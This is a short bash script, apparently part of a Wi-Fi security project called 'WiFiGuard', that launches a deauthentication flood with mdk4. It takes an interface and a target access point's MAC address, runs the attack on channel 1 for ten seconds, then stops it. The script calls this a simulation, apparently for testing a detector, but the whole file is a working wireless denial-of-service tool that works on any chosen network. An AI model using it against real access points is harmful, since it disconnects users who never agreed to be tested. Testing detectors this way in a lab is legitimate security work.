#!/bin/bash
INTERFACE="${1:-wlp61s0mon}"
AP_MAC="$2"

if [ -z "$AP_MAC" ]; then
    echo "用法: sudo $0 <接口> <AP的MAC>"
    echo ""
    echo "示例: sudo $0 wlp61s0mon 46:C3:E1:A9:01:7E"
    echo ""
    echo "提示: 运行 ./scan.sh 查看周围网络获取 MAC 地址"
    exit 1
fi

echo "[WiFiGuard] 模拟Flood泛洪攻击..."
echo "  接口: $INTERFACE"
echo "  目标 AP: $AP_MAC"

sudo mdk4 "$INTERFACE" d -B "$AP_MAC" -c 1 &
PID=$!
sleep 10
sudo kill $PID 2>/dev/null
echo "  攻击结束"
